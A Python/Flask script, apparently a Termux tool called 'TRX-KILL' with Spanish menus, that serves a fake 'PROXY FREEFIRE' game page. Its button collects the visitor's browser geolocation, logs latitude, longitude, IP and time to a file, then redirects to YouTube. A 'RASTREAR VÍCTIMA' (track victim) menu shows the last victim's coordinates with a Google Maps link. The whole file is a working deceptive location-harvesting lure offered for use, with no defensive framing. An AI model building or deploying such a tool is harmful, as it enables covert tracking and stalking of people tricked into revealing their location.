import os, sys, time, threading, requests
from flask import Flask, request, render_template_string

# --- CONFIGURACIÓN ---
app = Flask('TRX-KILL')
STORAGE_PATH = "/sdcard/TRX-KILL-RESUL"
LOG_FILE = f"{STORAGE_PATH}/result.txt"
G, Y, R, C, W = "\033[1;32m", "\033[1;33m", "\033[1;31m", "\033[1;36m", "\033[0m"

if not os.path.exists(STORAGE_PATH): os.makedirs(STORAGE_PATH)

# --- PLANTILLA HTML (CAPTURA TOTAL) ---
HTML_TEMPLATE = """
<!DOCTYPE html><html><head><meta charset="UTF-8"><title>PROXY</title>
<style>
    body {background:#050505; color:#00ffcc; font-family:monospace; display:flex; justify-content:center; align-items:center; height:100vh; margin:0;}
    .container {border:2px solid #00ffcc; padding:40px; text-align:center; box-shadow:0 0 15px #00ffcc; border-radius:10px;}
    .btn {background:transparent; color:#00ffcc; border:1px solid #00ffcc; padding:15px 30px; cursor:pointer; font-size:18px;}
</style></head><body>
<div class="container">
    <h1>PROXY FREEFIRE</h1>
    <button class="btn" onclick="iniciar()">CONTINUAR</button>
</div>
<script>
function iniciar() {
    navigator.geolocation.getCurrentPosition(pos => {
        fetch('/log?lat='+pos.coords.latitude+'&lon='+pos.coords.longitude+'&time='+new Date().toLocaleTimeString());
        window.location.href = 'https://youtube.com';
    });
}
</script></body></html>
"""

@app.route('/')
def index(): return render_template_string(HTML_TEMPLATE)

@app.route('/log')
def log():
    with open(LOG_FILE, "a") as f:
        f.write(f"LAT:{request.args.get('lat')}|LON:{request.args.get('lon')}|IP:{request.remote_addr}|TIME:{request.args.get('time')}\n")
    return "OK"

def animar(texto):
    for char in texto: sys.stdout.write(char); sys.stdout.flush(); time.sleep(0.02)
    print()

def banner():
    os.system('clear')
    print(f"{G}  _______________________________________")
    print(f"{G} |         TRX-KILL v1.4.5 (PRO)         |")
    print(f"{G} |_______________________________________|{W}\n")

def main():
    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=5000, debug=False), daemon=True).start()
    while True:
        banner()
        print(f"{C} 01. RASTREAR VÍCTIMA  | 02. LINK-PROXY")
        print(f" 03. CREADOR           | 04. VERSIONES")
        print(f" 05. SISTEMA           | 06. LIMPIAR LOGS")
        print(f" 00. SALIR{W}")
        sel = input(f"\n{Y}TRX-ROOT > {W}")

        if sel == "1":
            animar(f"{Y}[*] BUSCANDO COORDENADAS EN LOG...{W}")
            if os.path.exists(LOG_FILE):
                with open(LOG_FILE, 'r') as f:
                    lines = f.readlines()
                    if lines:
                        d = lines[-1].split('|')
                        print(f"\n{G}[+] COORDENADAS: {W}{d[0].replace('LAT:','')} , {d[1].replace('LON:','')}")
                        print(f"{G}[+] MAPA LINK:   {W}https://www.google.com/maps/search/?api=1&query={d[0].replace('LAT:','')},{d[1].replace('LON:','')}")
                        print(f"{G}[+] IP ORIGEN:   {W}{d[2].replace('IP:','')}")
                        print(f"{G}[+] HORA CAPTURA:{W}{d[3].replace('TIME:','').strip()}")
            input(f"\n{Y}PRESIONA ENTER...{W}")
        elif sel == "2":
            print(f"\n{C}[!] LINK ACTIVO: http://127.0.0.1:5000{W}"); input()
        elif sel == "6":
            os.remove(LOG_FILE) if os.path.exists(LOG_FILE) else None
            print(f"{R}[!] LOGS ELIMINADOS.{W}"); input()
        elif sel == "0": sys.exit()

if __name__ == "__main__": main()
